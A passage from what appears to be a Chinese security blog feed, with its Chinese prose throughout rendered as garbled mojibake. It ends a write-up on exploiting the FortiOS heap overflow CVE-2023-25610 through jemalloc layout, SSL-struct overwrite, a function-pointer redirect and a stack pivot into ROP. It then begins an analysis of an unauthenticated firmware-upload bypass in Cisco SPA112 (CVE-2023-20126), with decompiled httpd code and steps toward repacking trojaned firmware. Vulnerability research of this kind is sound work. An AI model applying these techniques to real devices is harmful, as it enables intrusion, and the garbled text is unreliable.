<p>åœ¨ PoC ä¸­æˆ‘ä»¬æ„é€ çš„ CL å€¼ä¸º 0x100100000ï¼Œåˆ†é…çš„å†…å­˜ä½äºä½åœ°å€ï¼Œæˆ‘ä»¬å°è¯•æ‰©å¤§ CL å€¼ï¼Œçœ‹çœ‹èƒ½å¦å°†å†…å­˜åˆ†é…åˆ° 0x7f çš„é«˜åœ°å€ã€‚</p>
<p>ç»è¿‡æµ‹è¯•ï¼Œå½“ CL ç­‰äº 0x100821000 æ—¶ï¼ŒSSL ç»“æ„ä½“åœ°å€ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2023-25610-3.png"
                     
                ></p>
<p>å‘ç”Ÿå´©æºƒæ—¶çš„çŠ¶æ€ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2023-25610-4.png"
                     
                ></p>
<p>æ­¤æ—¶æ•°æ®è¢«æ‹·è´åˆ° 0x7f çš„é«˜åœ°å€ï¼Œå¯¹åº”å†…å­˜å¸ƒå±€ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2023-25610-5.png"
                     
                ></p>
<p>è¿™æ ·å¯æ§çš„æ•°æ®æ°å¥½ä½äº SSL ç»“æ„ä½“ä¹‹ä¸Šä¸”ä¸¤ä¸ªå†…å­˜å—ä¹‹é—´ä¸å­˜åœ¨é—´éš™ï¼Œå¯ä»¥é€šè¿‡æº¢å‡ºå»è¦†ç›–å…¶å†…éƒ¨å˜é‡ã€‚</p>
<p>æˆ‘ä»¬è§‚å¯Ÿåˆ° SSL ç»“æ„ä½“åœ°å€æ˜¯ 0x7f5aee9b8000ï¼Œè€Œå†…å­˜å—èµ·å§‹åœ°å€ä¸º 0x7f5aee800000ï¼Œä¸¤è€…ä¹‹é—´è¿˜å­˜åœ¨å¤§å°ä¸º 0x1b8000 çš„å…¶ä»–æ•°æ®ï¼Œå†æŸ¥çœ‹æ ˆå›æº¯ä¿¡æ¯å’Œå´©æºƒç°åœºï¼Œä»£ç å°è¯•ä» 0x9e9f1df98d3a1000 åœ°å€å–å€¼ï¼Œè¿™æ˜¾ç„¶ä¸æ˜¯ä¸€ä¸ªæ­£å¸¸åœ°å€ï¼Œçœ‹èµ·æ¥åƒç»è¿‡æŸç§è¿ç®—åå¾—åˆ°çš„æŒ‡é’ˆã€‚</p>
<p>å°è¯•ä¿®æ”¹å‘é€çš„è¯·æ±‚æ•°æ®ï¼Œå‘ç°è¿™ä¸ªå€¼å’Œæˆ‘ä»¬çš„è¾“å…¥æœ‰å…³ï¼Œå¹¶ä¸”æ ¹æ® jemalloc å†…å­˜ç®¡ç†ç®—æ³•ç¡®å®šï¼ŒSSL ç»“æ„ä½“ä¹‹ä¸Šçš„æ•°æ®å¯èƒ½æ˜¯ jemalloc ä¸­çš„ä¸€äº›å…³é”®å˜é‡ã€‚</p>
<p>å½“å‘é€æŸç‰¹å®šå€¼æ—¶ï¼Œå¯ä»¥è®©ä»¥ä¸Šè®¡ç®—å¾—åˆ°ä¸€ä¸ªåˆæ³•çš„åœ°å€ï¼Œé˜²æ­¢éæ³•åœ°å€è®¿é—®å´©æºƒã€‚åœ¨å¡«å……åˆ° SSL ç»“æ„ä½“ä¹‹å‰çš„æ•°æ®ä¸­è¿˜å­˜åœ¨æ•°ä¸ªç±»ä¼¼çš„åœ°å€è®¡ç®—è¿‡ç¨‹ï¼Œä¾æ¬¡å¸ƒç½®å¥½ç›¸å…³æ•°æ®å°±èƒ½ç»•è¿‡ã€‚</p>
<p>æ¥ç€è¦†ç›– SSL ç»“æ„ä½“ï¼Œå°è¯•åœ¨å…¶ä¸­å¡«å……éšæœºæ•°æ®å¾—åˆ°ä»¥ä¸‹å´©æºƒï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2023-25610-6.png"
                     
                ></p>
<p>åœ¨å¯¹åº”ä½ç½®å¡«å……ä¸€ä¸ªåˆæ³•åœ°å€ï¼Œç»§ç»­æ‰§è¡Œï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2023-25610-7.png"
                     
                ></p>
<p>ä»£ç ç”¨ EVP_CIPHER_flags å‡½æ•°å–å€¼å¹¶ call rax è·³è½¬åˆ°å¯¹åº”ä½ç½®ã€‚å¦‚æœå¯ä»¥æ‰¾åˆ°ä¸€ä¸ªåˆé€‚çš„ç›®æ ‡åœ°å€ï¼Œå°±èƒ½åŠ«æŒæ§åˆ¶æµæ¥æ‰§è¡Œè¿›ä¸€æ­¥åˆ©ç”¨ã€‚</p>
<p>æ‰€è°“åˆé€‚çš„ç›®æ ‡åœ°å€ï¼Œå³èƒ½å¦åˆ©ç”¨ç¨‹åºä¸­çš„ä»£ç ç‰‡æ®µï¼Œå°†æ ˆè¿ç§»åˆ°å¯æ§å†…å­˜ï¼Œæ„é€  ROP é“¾å®Œæˆåç»­åˆ©ç”¨ã€‚åœ¨ init ç¨‹åºä¸­å­˜åœ¨ä¸€ä¸ªå«åš ENGINE_ctrl  çš„å‡½æ•°ï¼Œå…¶å†…å®¹å¦‚ä¸‹ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2023-25610-8.png"
                     
                ></p>
<p>æ­¤å‡½æ•°ä¼šä»å‚æ•°ä¸­è·å–ä¸€äº›å˜é‡ï¼Œåˆ¤æ–­ä¹‹åå°†å–å‡ºçš„å€¼ä½œä¸ºå‡½æ•°æŒ‡é’ˆå»è°ƒç”¨ã€‚è¿™ä¸ªå‡½æ•°åœ°å€ä½äº GOT è¡¨ä¸­ï¼Œä¸”æŸ¥çœ‹ call rax æ—¶å¯„å­˜å™¨çŠ¶æ€å‘ç°ç¬¬ä¸€ä¸ªå‚æ•°çš„åœ°å€ä¸­åŒ…å«å¯æ§æ•°æ®ã€‚æˆ‘ä»¬å°† EVP_CIPHER_flags çš„åœ°å€æŒ‡å‘ ENGINE_ctrl  å‡½æ•°ï¼Œè¿™æ ·å°±å¯ä»¥å°†ä¸€ä¸ªåªèƒ½éƒ¨åˆ†æ§åˆ¶ç¨‹åºæ‰§è¡Œæµçš„æƒ…å†µè½¬å˜æˆäº†å®Œå…¨æ§åˆ¶ç¨‹åºæ‰§è¡Œæµã€‚</p>
<p>å½“æ‰§è¡ŒæŒ‡é’ˆè·³è½¬æ—¶ RBP å¯„å­˜å™¨æ°å¥½æŒ‡å‘æˆ‘ä»¬å¯æ§çš„æ•°æ®ï¼Œè¿™é‡Œåˆ©ç”¨ push_rbp_pop_rsp å®ç°æ ˆè¿ç§»ï¼Œè¿ç§»ä¹‹åå°±å¯ä»¥æŒ‰ç…§å¸¸è§„æ€è·¯è¿›è¡Œ ROP å®Œæˆåˆ©ç”¨ã€‚</p>
<h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><p><a class="link"   href="https://www.fortiguard.com/psirt/FG-IR-23-001" >https://www.fortiguard.com/psirt/FG-IR-23-001<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://wanghenshui.github.io/2019/05/01/jemalloc.html" >https://wanghenshui.github.io/2019/05/01/jemalloc.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
  </entry>
  <entry>
    <title>Cisco SPA112 å›ºä»¶è§£åŒ…/æ‰“åŒ…åˆ†æ</title>
    <url>/2023/05/12/spa112/</url>
    <content><![CDATA[<p>SPA112 æ˜¯ Cisco æ—©æœŸæ¨å‡ºçš„ä¸€æ¬¾è¯­éŸ³ç½‘å…³ï¼Œ2023 å¹´ 5 æœˆ 3 æ—¥ï¼ŒCisco å®˜æ–¹å‘å¸ƒäº†å…³äºæ­¤è®¾å¤‡çš„æ¼æ´ CVE-2023-20126ï¼Œæœ¬æ–‡å¯¹æ­¤æ¼æ´è¿›è¡Œåˆ†æã€‚</p>
<span id="more"></span>

<h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>å¯ä»¥åœ¨ Cisco <a class="link"   href="https://software.cisco.com/download/home/283998771/type/282463187/release/1.4.1%20SR5" >å®˜æ–¹ç½‘ç«™<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ä¸‹è½½åˆ°è¯¥è®¾å¤‡çš„å›ºä»¶ï¼Œå½“å‰æœ€æ–°ç‰ˆä¸º 1.4.1 SR5 (å·²åœæ­¢ç»´æŠ¤)ã€‚</p>
<p>ç›´æ¥ä½¿ç”¨ binwalk è§£å‹ï¼Œè§£å‹åå¾—åˆ°ä¸€ä¸ª squashfs æ–‡ä»¶ç³»ç»Ÿã€‚</p>
<p>è¯¥æ¼æ´æ¯”è¾ƒç®€å•ï¼Œå‡ºç°åœ¨ web æœåŠ¡ä¸­ã€‚å…³é”®æ–‡ä»¶ä¸º &#x2F;usr&#x2F;sbin&#x2F;httpdï¼Œæˆ‘ä»¬ä½¿ç”¨ IDA é€†å‘åˆ†æï¼Œæ‰¾åˆ°è¯·æ±‚å¤„ç†çš„ä¸»è¦éƒ¨åˆ†</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">v114 = uri_handler[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">if</span> ( !uri_handler[<span class="number">0</span>] )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_113;</span><br><span class="line">v115 = uri_handler;</span><br><span class="line"><span class="keyword">while</span> ( <span class="number">2</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span> ( kk = v114; ; kk = v117 + <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v117 = <span class="built_in">strchr</span>(kk, <span class="string">&#x27;|&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v117 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( match(kk, v117 - kk, v39) )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_98;</span><br><span class="line">  &#125;</span><br><span class="line">  v118 = <span class="built_in">strlen</span>(kk);</span><br><span class="line">  <span class="keyword">if</span> ( !match(kk, v118, v39) )</span><br><span class="line">  &#123;</span><br><span class="line">    v119 = v115[<span class="number">6</span>];</span><br><span class="line">    v115 += <span class="number">6</span>;</span><br><span class="line">    v114 = v119;</span><br><span class="line">    <span class="keyword">if</span> ( v119 )</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_113;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">LABEL_98:</span><br><span class="line">is_need_auth = v115[<span class="number">5</span>];</span><br><span class="line"><span class="keyword">if</span> ( is_need_auth )</span><br><span class="line">&#123;</span><br><span class="line">  (is_need_auth)(&amp;unk_625F4, &amp;unk_62634, &amp;unk_62674);</span><br><span class="line">  dword_623D4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(v39, <span class="string">&quot;login.asp&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !sub_11120(v39) )</span><br><span class="line">    &#123;</span><br><span class="line">      v156 = dword_64EA4;</span><br><span class="line">      <span class="keyword">if</span> ( dword_64EA4 || sub_10340() &gt;= <span class="number">0</span> )</span><br><span class="line">        v39 = <span class="string">&quot;login.asp&quot;</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        sub_119FC(<span class="number">403</span>, <span class="string">&quot;Forbidden&quot;</span>, v156, <span class="string">&quot;Can&#x27;t use wireless interface to access web.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">dword_6DD10 = <span class="number">0</span>;</span><br><span class="line">v37 = strcasecmp(s, <span class="string">&quot;post&quot;</span>);</span><br><span class="line">cgi_handler = v115[<span class="number">3</span>];</span><br><span class="line"><span class="keyword">if</span> ( !v37 )</span><br><span class="line">  dword_6DD10 = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> ( cgi_handler )</span><br><span class="line">&#123;</span><br><span class="line">  (cgi_handler)(v39, dword_625F0, v173, v51);</span><br><span class="line">  <span class="keyword">if</span> ( !dword_623C8 )</span><br><span class="line">  &#123;</span><br><span class="line">    v157 = fileno(dword_625F0);</span><br><span class="line">    v158 = fcntl(v157, <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v158 != <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v159 = fileno(dword_625F0);</span><br><span class="line">      <span class="keyword">if</span> ( fcntl(v159, <span class="number">4</span>, v158 | <span class="number">0x800</span>) != <span class="number">-1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( fgetc(dword_625F0) != <span class="number">-1</span> )</span><br><span class="line">          fgetc(dword_625F0);</span><br><span class="line">        v160 = fileno(dword_625F0);</span><br><span class="line">        fcntl(v160, <span class="number">4</span>, v158);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿™éƒ¨åˆ†é€»è¾‘å’Œä¸€äº›å¼€æº web æœåŠ¡ç›¸ä¼¼ï¼Œé€šè¿‡å°†è¯·æ±‚ URI å’Œç¨‹åºä¸­ä¸€ä¸ªæ•°ç»„ç›¸æ¯”è¾ƒï¼Œå–å‡ºç›¸åŒæ¡ç›®çš„å‡½æ•°æŒ‡é’ˆè°ƒç”¨ã€‚åˆ—è¡¨ä¸­çš„æ¯ä¸ªé¡¹ç›®ç¬¬ 1 ä¸ªæˆå‘˜æ˜¯ uri å­—ç¬¦ä¸²ï¼Œç¬¬ 4 ä¸ªæˆå‘˜æ˜¯ handler å‡½æ•°æŒ‡é’ˆï¼Œç¬¬ 6 ä¸ªæˆå‘˜è¡¨ç¤ºè¯¥ CGI æ¥å£æ˜¯å¦éœ€è¦èº«ä»½éªŒè¯ã€‚</p>
<p>ç»Ÿè®¡æ‰€æœ‰æ¥å£ï¼Œæˆ‘ä»¬å‘ç°åœ¨æ— éœ€æˆæƒçš„æ¥å£ä¸­ï¼ŒåŒ…å«ä¸€ä¸ªå«åš upgrade.cgi çš„æ¥å£ï¼Œå¯¹åº” handler å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">upgrade_handler</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">int</span> a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// r1</span></span><br><span class="line">  <span class="type">bool</span> v8; <span class="comment">// zf</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v12; <span class="comment">// r1</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// r3</span></span><br><span class="line">  FILE *v16; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// [sp+Ch] [bp-42Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v19; <span class="comment">// [sp+17h] [bp-421h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v20; <span class="comment">// [sp+18h] [bp-420h]</span></span><br><span class="line">  <span class="type">char</span> v21; <span class="comment">// [sp+19h] [bp-41Fh]</span></span><br><span class="line"></span><br><span class="line">  v18 = a3;</span><br><span class="line">  dword_64EA8 = <span class="number">22</span>;</span><br><span class="line">  system(<span class="string">&quot;cp /www/Success_u.asp /tmp/.&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;cp /www/Fail_r_s.asp /tmp/.&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;cp /www/Success_u_s.asp /tmp/.&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;cp /www/Fail_u_s.asp /tmp/.&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;cp /sbin/write /tmp/write&quot;</span>);</span><br><span class="line">  v6 = v18;</span><br><span class="line">  <span class="keyword">if</span> ( v18 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = v6 + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (v6 + <span class="number">1</span>) &gt;= <span class="number">0x400</span> )</span><br><span class="line">        v7 = <span class="number">1024</span>;</span><br><span class="line">      v8 = sub_108E0(&amp;v19, v7, a2) == <span class="number">0</span>;</span><br><span class="line">      result = &amp;v19;</span><br><span class="line">      <span class="keyword">if</span> ( v8 )</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">      v9 = v18 - <span class="built_in">strlen</span>(&amp;v19);</span><br><span class="line">      v18 = v9;</span><br><span class="line">      v6 = v9;</span><br><span class="line">      <span class="keyword">if</span> ( !strncasecmp(&amp;v19, <span class="string">&quot;Content-Disposition:&quot;</span>, <span class="number">0x14</span>u) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">strstr</span>(&amp;v19, <span class="string">&quot;name=\&quot;file\&quot;&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          dword_84190 = <span class="number">1</span>;</span><br><span class="line">          nvram_set(<span class="string">&quot;submit_button&quot;</span>, <span class="string">&quot;Upgrade&quot;</span>);</span><br><span class="line">          v17 = <span class="number">2</span>;</span><br><span class="line">LABEL_14:</span><br><span class="line">          <span class="keyword">if</span> ( !nvram_match(<span class="string">&quot;submit_button&quot;</span>, <span class="string">&quot;Upgrade&quot;</span>)</span><br><span class="line">            || (dword_5DED4 = <span class="number">257</span>, dword_6DD88)</span><br><span class="line">            || nvram_match(<span class="string">&quot;remote_upgrade&quot;</span>, &amp;byte_4B814)</span><br><span class="line">            || !nvram_match(<span class="string">&quot;router_mode&quot;</span>, &amp;byte_4B814) )</span><br><span class="line">          &#123;</span><br><span class="line">            v11 = v18;</span><br><span class="line">            <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              v12 = v11 + <span class="number">1</span>;</span><br><span class="line">              <span class="keyword">if</span> ( v11 &lt;= <span class="number">0</span> )</span><br><span class="line">              &#123;</span><br><span class="line">LABEL_25:</span><br><span class="line">                v13 = sub_1E048(<span class="number">0</span>, a2, &amp;v18, v17, a4);</span><br><span class="line">                v14 = v18;</span><br><span class="line">                dword_64EA8 = v13;</span><br><span class="line">                <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">if</span> ( v12 &gt;= <span class="number">0x400</span> )</span><br><span class="line">                v12 = <span class="number">1024</span>;</span><br><span class="line">              v8 = sub_108E0(&amp;v19, v12, a2) == <span class="number">0</span>;</span><br><span class="line">              result = &amp;v19;</span><br><span class="line">              <span class="keyword">if</span> ( v8 )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              v11 = v18 - <span class="built_in">strlen</span>(&amp;v19);</span><br><span class="line">              v18 = v11;</span><br><span class="line">              <span class="keyword">if</span> ( v19 == <span class="number">10</span> &amp;&amp; !v20 || v19 == <span class="number">13</span> &amp;&amp; v20 == <span class="number">10</span> &amp;&amp; !v21 )</span><br><span class="line">                <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v16 = fopen(<span class="string">&quot;/dev/console&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( v16 )</span><br><span class="line">            &#123;</span><br><span class="line">              fwrite(<span class="string">&quot;Can&#x27;t upgrade from wan side\n&quot;</span>, <span class="number">1u</span>, <span class="number">0x1C</span>u, v16);</span><br><span class="line">              fclose(v16);</span><br><span class="line">            &#125;</span><br><span class="line">            v14 = v18;</span><br><span class="line">            dword_64EA8 = <span class="number">99</span>;</span><br><span class="line">LABEL_26:</span><br><span class="line">            <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              result = a2;</span><br><span class="line">              v15 = a2;</span><br><span class="line">              <span class="keyword">if</span> ( v14 &lt;= <span class="number">0</span> )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              <span class="keyword">while</span> ( dword_623C8 )</span><br><span class="line">              &#123;</span><br><span class="line">                BIO_gets(result, &amp;v19, <span class="number">1</span>, v15);</span><br><span class="line">                result = a2;</span><br><span class="line">                v15 = a2;</span><br><span class="line">                <span class="keyword">if</span> ( v18 &lt;= <span class="number">0</span> )</span><br><span class="line">                  <span class="keyword">return</span> result;</span><br><span class="line">              &#125;</span><br><span class="line">              result = sub_10548(&amp;v19, <span class="number">1</span>, <span class="number">1025</span>, v15);</span><br><span class="line">              <span class="keyword">if</span> ( result &lt; <span class="number">0</span> )</span><br><span class="line">                <span class="keyword">return</span> result;</span><br><span class="line">              v14 = v18 - result;</span><br><span class="line">              v18 -= result;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">strstr</span>(&amp;v19, <span class="string">&quot;name=\&quot;restore\&quot;&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          dword_623AC = <span class="number">1</span>;</span><br><span class="line">          nvram_set(<span class="string">&quot;submit_button&quot;</span>, <span class="string">&quot;Restore&quot;</span>);</span><br><span class="line">          v17 = <span class="number">1</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v9 &lt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v17 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;\n Fail: upgrade file size = %d \n&quot;</span>, v18);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿™ä¸ªæ¥å£è´Ÿè´£å¯¹è®¾å¤‡è¿›è¡Œå›ºä»¶å‡çº§ï¼Œä»£ç ä¼šå°è¯•è·å– Content-Disposition è¯·æ±‚å‚æ•°ï¼Œåˆ¤æ–­å…¶ä¸­çš„ name ä¸º file è¿˜æ˜¯ restoreã€‚å½“ name ä¸º file æ—¶ï¼Œä»£ç è®¾ç½® submit_button å˜é‡ä¸º Upgradeï¼Œåœ¨åç»­çš„ if æ¡ä»¶åˆ¤æ–­ä¸­ï¼Œä¼šæ£€æŸ¥ submit_button å˜é‡ï¼Œå¦‚æœå®ƒç­‰äº Upgradeï¼Œåˆ™ç»§ç»­åˆ¤æ–­ remote_upgrade ç­‰å‚æ•°å€¼ã€‚è¿™æ ·çš„ç›®çš„æ˜¯ä¸ºäº†é˜²æ­¢ç”¨æˆ·ä» WAN ç«¯æ‰§è¡Œå›ºä»¶å‡çº§æ“ä½œã€‚</p>
<p>è§‚å¯Ÿé€»è¾‘ï¼Œå½“ name ç­‰äº Restore æ—¶ï¼Œä»£ç è®¾ç½® submit_button ç­‰äº Restoreï¼Œä¹‹åå›åˆ° if åˆ¤æ–­ï¼Œæ­¤æ—¶ nvram_match å‡½æ•°è¿”å› 0ï¼Œç¬¬ä¸€æ¡é€»è¾‘æˆç«‹ï¼Œåˆ™ä¼šè·³è¿‡åç»­åˆ¤æ–­è¿›å…¥ if è¯­å¥ï¼Œéšåè°ƒç”¨ sub_1E048 å‡½æ•°ï¼Œå¼€å§‹å‡çº§ç³»ç»Ÿã€‚</p>
<p>å› æ­¤ï¼Œæ²¡æœ‰ç»è¿‡æˆæƒçš„ç”¨æˆ·å¯ä»¥å°è¯•æ„é€ ä¸€ä¸ªæ¶æ„çš„å›ºä»¶æ–‡ä»¶ï¼Œåˆ©ç”¨è¿™ä¸ªæ¥å£ä¸Šä¼ åˆ°è®¾å¤‡ï¼Œå½“å‡çº§å®Œæˆä¹‹åæ–°çš„ç³»ç»Ÿä¸­å°±ä¼šåŒ…å«æ”»å‡»è€…æ§åˆ¶çš„æœ¨é©¬ç¨‹åºã€‚</p>
<h3 id="åˆ©ç”¨åˆ†æ"><a href="#åˆ©ç”¨åˆ†æ" class="headerlink" title="åˆ©ç”¨åˆ†æ"></a>åˆ©ç”¨åˆ†æ</h3><p>è¯¥æ¼æ´åŸç†æ¯”è¾ƒç®€å•ï¼Œä½†æ˜¯æƒ³åˆ©ç”¨å´è¦èŠ±è´¹ä¸€äº›å¿ƒæ€ã€‚å› ä¸ºéœ€è¦çŸ¥é“åˆæ³•çš„å›ºä»¶æ ¼å¼ï¼Œä»¥åŠå¦‚ä½•æ­£ç¡®è§£åŒ…å’Œæ‰“åŒ…ã€‚</p>
<p>æˆ‘ä»¬é¦–å…ˆæ¥åˆ†æä¸€ä¸‹è®¾å¤‡çš„å›ºä»¶æ ¼å¼ï¼ŒæŸ¥çœ‹ binwalk è§£æç»“æœï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">392           0x188           uImage header, header size: 64 bytes, header CRC: 0xF534C9EA, created: 2106-02-07 06:28:15, image size: 1572736 bytes, Data Address: 0x20008000, Entry Point: 0x20008000, data CRC: 0xE6D5E563, OS: Linux, CPU: ARM, image type: OS Kernel Image, compression type: none, image name: &quot;SP2Xcybertan_rom_bin&quot;</span><br><span class="line">456           0x1C8           Linux kernel ARM boot executable zImage (little-endian)</span><br><span class="line">13596         0x351C          gzip compressed data, maximum compression, from Unix, last modified: 2019-10-14 04:38:56</span><br><span class="line">1573192       0x180148        uImage header, header size: 64 bytes, header CRC: 0x96353C43, created: 2106-02-07 06:28:15, image size: 8478720 bytes, Data Address: 0x0, Entry Point: 0x0, data CRC: 0x96855278, OS: Linux, CPU: ARM, image type: Filesystem Image, compression type: none, image name: &quot;SP2Xcybertan_rom_bin&quot;</span><br><span class="line">1573256       0x180188        Squashfs filesystem, little endian, non-standard signature, version 3.1, size: 8476193 bytes, 1028 inodes, blocksize: 131072 bytes, created: 2019-10-14 04:51:02</span><br></pre></td></tr></table></figure></div>

<p>å›ºä»¶ä¸­ä¸»è¦åŒ…å« Linux å†…æ ¸ä»¥åŠ squashfs æ–‡ä»¶ç³»ç»Ÿä¸¤éƒ¨åˆ†ï¼Œè€ƒè™‘åˆ°å¸Œæœ›æ¤å…¥æœ¨é©¬ç¨‹åºï¼Œå†…æ ¸éƒ¨åˆ†å¯ä»¥ç•¥è¿‡ï¼Œæ‰€ä»¥ä¸»è¦å…³æ³¨ç‚¹åº”æ”¾åœ¨ Squashfs filesystem ä¸Šé¢ã€‚</p>
<p>ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å°†æ–‡ä»¶ç³»ç»Ÿåˆ‡å‰²å‡ºæ¥ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">dd if=ori.bin of=sqfs.ori bs=1 skip=1573256</span><br></pre></td></tr></table></figure></div>

<p>æŒ‰ç…§å¸¸è§„æ€è·¯ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ unsquashfs å·¥å…·è§£å‹ sqfs.oriï¼Œä½†æ˜¯ç›´æ¥è§£å‹ä¼šæç¤ºé”™è¯¯ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">FATAL ERROR: Can&#x27;t find a valid SQUASHFS superblock on ./sqfs.ori</span><br></pre></td></tr></table></figure></div>

<p>ç”±äº unsquashfs  ç­‰ sqfs å·¥å…·æ˜¯å¼€æºçš„ï¼ŒçŒœæµ‹å‚å•†å¯èƒ½å°†è¿™éƒ¨åˆ†ä»£ç åšäº†ä¿®æ”¹ã€‚å¦‚æœæƒ³è¦æ­£å¸¸è§£å‹ä»¥åŠæ‰“åŒ…ï¼Œé‚£ä¹ˆå°±è¦æ‰¾å‡ºä¿®æ”¹äº†å“ªäº›éƒ¨åˆ†ï¼Œæƒ³åŠæ³•è¿˜åŸç›¸å…³é€»è¾‘ã€‚</p>
